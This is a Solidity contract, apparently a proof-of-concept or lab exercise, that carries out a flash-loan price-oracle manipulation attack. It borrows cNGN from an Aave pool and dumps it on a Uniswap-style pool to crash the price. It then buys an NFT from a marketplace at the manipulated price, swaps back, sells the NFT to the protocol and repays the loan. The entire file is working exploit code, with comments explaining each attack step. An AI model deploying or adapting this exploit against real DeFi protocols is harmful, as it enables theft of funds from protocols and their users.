// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {FlashLoanSimpleReceiverBase} from "aave-v3-core/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol";
import {IPoolAddressesProvider} from "aave-v3-core/contracts/interfaces/IPoolAddressesProvider.sol";
import {IERC20} from "aave-v3-core/contracts/dependencies/openzeppelin/contracts/IERC20.sol";
import {Uniswap} from "./Uniswap.sol";
import {NftMarketplace} from "./NftMarketPlace.sol";
import {Test, console} from "forge-std/Test.sol";

contract FlashContract is FlashLoanSimpleReceiverBase {
    address payable owner;
    Uniswap public uniswap;
    NftMarketplace public nftMarketplace;

    constructor(address _addressProvider, address _uniswap, address _nftMarketplace)
        FlashLoanSimpleReceiverBase(IPoolAddressesProvider(_addressProvider))
    {
        uniswap = Uniswap(_uniswap);
        nftMarketplace = NftMarketplace(_nftMarketplace);
    }

    function fn_RequestFlashLoan(address _token, uint256 _amount) public {
        address receiverAddress = address(this);
        address asset = _token;
        uint256 amount = _amount;
        bytes memory params = "";
        uint16 referralCode = 0;

        POOL.flashLoanSimple(receiverAddress, asset, amount, params, referralCode);
    }

    //This function is called after your contract has received the flash loaned amount
    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata params)
        external
        override
        returns (bool)
    {
        // Based on pool of 100cNGN | 10 USDT tokens.
        // Approve Uniswap to spend the loaned cNGN token
        IERC20(asset).approve(address(uniswap), amount);

        // Swap cNGN for USDT to crash cNGN price on the DEX by draining its reserves
        console.log("Price of an NFT before swap", uniswap.getPriceInCngn() * 10);
        uniswap.swapCNGNForUSDT(amount);

        // Purchase NFT while oracle price is artificially low (cheaper in cNGN terms)
        // 1 Nft = 10 cNGN token (constant price!)
        console.log("Price of an NFT after swap", uniswap.getPriceInCngn() * 10);
        uint256 tokenId = nftMarketplace.buyNftWithCngnToken(address(this));

        // Swap acquired USDT back to cNGN to restore original price balance on the DEX
        // also so we can repay our loan
        uint256 usdtBalance = uniswap.usdtToken().balanceOf(address(this));
        uniswap.usdtToken().approve(address(uniswap), usdtBalance);
        uniswap.swapUSDTForCNGN(usdtBalance);

        // Sell the NFT back to the protocol now that cNGN price has been reset
        nftMarketplace.sellNftForCngnToken(tokenId);

        // 6. Repay the flash loan with the premium(fees)
        uint256 totalAmount = amount + premium;
        IERC20(asset).approve(address(POOL), totalAmount);

        return true;
    }

    receive() external payable {}
}
